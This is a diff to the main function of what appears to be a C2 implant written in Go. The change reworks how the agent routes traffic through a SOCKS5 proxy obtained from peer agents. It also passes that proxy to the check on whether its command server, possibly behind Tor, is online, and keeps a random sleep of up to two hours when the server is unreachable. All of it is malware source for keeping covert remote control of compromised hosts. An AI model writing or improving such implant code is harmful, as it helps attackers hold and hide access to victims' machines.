@@ -77,6 +77,7 @@ func main() {
 	if tun.HasInternetAccess() {
 		// if we do, we are feeling helpful
 		ctx, cancel := context.WithCancel(context.Background())
+		log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 		go agent.StartBroadcast(ctx, cancel)
 	} else {
 		// we don't, just wait for some other agents to help us
@@ -85,12 +86,12 @@ func main() {
 		go agent.BroadcastServer(ctx, cancel)
 		for ctx.Err() == nil {
 			if agent.AgentProxy != "" {
-				agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
-				log.Printf("[+] We got a proxy: %s", agent.AgentProxy)
+				log.Printf("[+] Thank you! We got a proxy: %s", agent.AgentProxy)
 				break
 			}
 		}
 	}
+	agent.HTTPClient = tun.EmpHTTPClient(agent.AgentProxy)
 
 	// parse C2 address
 	ccip := strings.Split(agent.CCAddress, "/")[2]
@@ -102,7 +103,6 @@ func main() {
 	}
 
 	// if CC is behind tor, a proxy is needed
-	agent.HTTPClient = tun.EmpHTTPClient("")
 	if tun.IsTor(agent.CCAddress) {
 		log.Printf("CC is on TOR: %s", agent.CCAddress)
 		if *c2proxy == "" {
@@ -146,7 +146,7 @@ func main() {
 connect:
 
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	if !agent.IsCCOnline() {
+	if !agent.IsCCOnline(agent.AgentProxy) {
 		log.Println("CC not online")
 		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
 	}
